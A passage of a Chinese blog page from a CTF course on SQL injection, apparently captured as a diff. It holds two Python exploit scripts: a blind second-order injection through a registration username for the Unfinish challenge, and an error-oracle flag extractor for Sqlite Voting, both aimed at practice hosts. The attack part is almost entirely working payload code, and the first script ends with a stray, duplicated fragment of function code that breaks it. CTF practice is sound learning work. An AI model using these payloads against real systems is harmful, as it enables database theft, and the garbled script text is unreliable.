class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">URL = <span class="string">'http://205c2b75-f634-4540-b69e-b584b950d287.node3.buuoj.cn'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"email"</span>: email,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = req.post(URL + <span class="string">'/login.php'</span>, data)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'1          &lt;/span&gt;'</span>.encode() <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(u, e)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: u,</span><br><span class="line">        <span class="string">"email"</span>: e,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = req.post(URL + <span class="string">'/register.php'</span>, data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">return</span> login(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">table = <span class="string">'qwertyuiopasdfghjklzxcvbnm'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(pl)</span>:</span></span><br><span class="line">    email = <span class="string">''</span>.join(random.sample(table, <span class="number">8</span>)) + <span class="string">'@qq.com'</span></span><br><span class="line">    <span class="keyword">return</span> reg(pl, email)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLen</span><span class="params">(sql)</span>:</span></span><br><span class="line">    print(<span class="string">"[+] Starting getLen..."</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">        sys.stdout.write(<span class="string">"[+] Len : -&gt; %d &lt;-\r"</span> % i)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">if</span> b(<span class="string">"1'and((select length((%s)))=%d)and'1"</span> % (sql, i)):</span><br><span class="line">            print(<span class="string">"[+] Len : -&gt; %d &lt;-"</span> % i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(sql=<span class="string">"version()"</span>)</span>:</span></span><br><span class="line">    _len = getLen(sql)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _len:</span><br><span class="line">        print(<span class="string">"[-] getLen 'Error'"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    print(<span class="string">"[+] Starting getData..."</span>)</span><br><span class="line">    table = <span class="string">'&#125;&#123;1234567890.-@_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>, _len + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> table:</span><br><span class="line">            sys.stdout.write(<span class="string">"[+] Result : -&gt; %s%c &lt;-\r"</span> % (res, ch))</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            pl = <span class="string">"1'and((select substr((%s)from(%d)for(1))='%s'))and'1"</span> % (</span><br><span class="line">                sql, pos, ch)</span><br><span class="line">            <span class="keyword">if</span> b(pl):</span><br><span class="line">                res += ch</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"[+] Result : -&gt; %s &lt;- "</span> % res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># right(left(x,pos),1)</span></span><br><span class="line"><span class="comment"># mid(x,pos,1)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># pl = "(select substr((version())from(1)for(1))='%s')" % '5'</span></span><br><span class="line">    <span class="comment"># pl = "1'and(%s)and'1" % pl</span></span><br><span class="line">    <span class="comment"># print(b(pl))</span></span><br><span class="line">    pl = <span class="string">'version()'</span></span><br><span class="line">    pl = <span class="string">'select t.c from (select (select 1)c union select * from flag)t limit 1 offset 1'</span></span><br><span class="line">    getData(pl)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'1          &lt;/span&gt;'</span>.encode() <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+<h2 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite  Voting"></a>[HarekazeCTF2019]Sqlite  Voting</h2><p>python暴破脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">'http://a96ca76b-1691-46e4-b5c9-b2c8dcc79f94.node3.buuoj.cn/vote.php'</span></span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">print(<span class="string">'[+] length:'</span>, l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">"C"</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">"F"</span>]&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = binascii.hexlify(<span class="string">b'flag&#123;'</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'0123456789ABCDEF'</span>:</span><br><span class="line">    t = <span class="string">'||'</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">'0123456789'</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  print(<span class="string">f'[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>'</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line">print(<span class="string">'[+] flag:'</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/file/weixin.png" alt="粗制乱造 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/file/zfb.png" alt="粗制乱造 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/%E7%BB%83%E4%B9%A0%E9%A2%98/" rel="tag"># 练习题</a>
+              <a href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag"># 杂项</a>
+              <a href="/tags/CTF%E8%AF%BE/" rel="tag"># CTF课</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/" rel="tag"># 绕过注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/jxsw_dbw_misc_1/" rel="prev" title="杂项一（大比武_CTF课_第十天）">
+      <i class="fa fa-chevron-left"></i> 杂项一（大比武_CTF课_第十天）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/jxsw_dbw_web_3/" rel="next" title="练习（大比武_CTF课_第三天）">
+      练习（大比武_CTF课_第三天） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#笔记"><span class="nav-number">2.</span> <span class="nav-text">笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#特殊字符绕过"><span class="nav-number">2.1.</span> <span class="nav-text">特殊字符绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#空格"><span class="nav-number">2.1.1.</span> <span class="nav-text">空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#逗号"><span class="nav-number">2.1.2.</span> <span class="nav-text">逗号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单引号"><span class="nav-number">2.1.3.</span> <span class="nav-text">单引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#比较符"><span class="nav-number">2.1.4.</span> <span class="nav-text">比较符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过关键字"><span class="nav-number">2.2.</span> <span class="nav-text">绕过关键字</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#关键字、函数"><span class="nav-number">2.2.1.</span> <span class="nav-text">关键字、函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用SQL语法特性绕过"><span class="nav-number">2.3.</span> <span class="nav-text">利用SQL语法特性绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过information-schema-无列名"><span class="nav-number">2.3.1.</span> <span class="nav-text">绕过information_schema(无列名)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入"><span class="nav-number">2.4.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#extractvalue"><span class="nav-number">2.4.1.</span> <span class="nav-text">extractvalue()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#updatexml"><span class="nav-number">2.4.2.</span> <span class="nav-text">updatexml()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入的小问题"><span class="nav-number">2.4.3.</span> <span class="nav-text">报错注入的小问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进阶注入"><span class="nav-number">2.5.</span> <span class="nav-text">进阶注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找可能存在的注入点"><span class="nav-number">2.5.1.</span> <span class="nav-text">寻找可能存在的注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试被禁用的字符"><span class="nav-number">2.5.2.</span> <span class="nav-text">测试被禁用的字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入"><span class="nav-number">2.5.3.</span> <span class="nav-text">二次注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#堆叠注入"><span class="nav-number">2.6.</span> <span class="nav-text">堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#堆叠注入原理"><span class="nav-number">2.6.1.</span> <span class="nav-text">堆叠注入原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用语句"><span class="nav-number">2.6.2.</span> <span class="nav-text">常用语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql语法利用-handler语句"><span class="nav-number">2.7.</span> <span class="nav-text">mysql语法利用-handler语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql语法利用-set语句"><span class="nav-number">2.8.</span> <span class="nav-text">mysql语法利用-set语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql语法利用-预处理"><span class="nav-number">2.9.</span> <span class="nav-text">mysql语法利用-预处理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#课后练习"><span class="nav-number">3.</span> <span class="nav-text">课后练习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-Blacklist"><span class="nav-number">3.1.</span> <span class="nav-text">[GYCTF2020]Blacklist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#handler语法"><span class="nav-number">3.1.1.</span> <span class="nav-text">handler语法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网鼎杯2018-Unfinish"><span class="nav-number">3.2.</span> <span class="nav-text">[网鼎杯2018]Unfinish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-Sqlite-Voting"><span class="nav-number">3.3.</span> <span class="nav-text">[HarekazeCTF2019]Sqlite  Voting</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="粗制乱造"
+      src="/file/avatar.png">
+  <p class="site-author-name" itemprop="name">粗制乱造</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">粗制乱造</span>
+</div>
+  <div class="powered-by">由 <a href="https://czlz.net/" class="theme-link">czlz.net</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
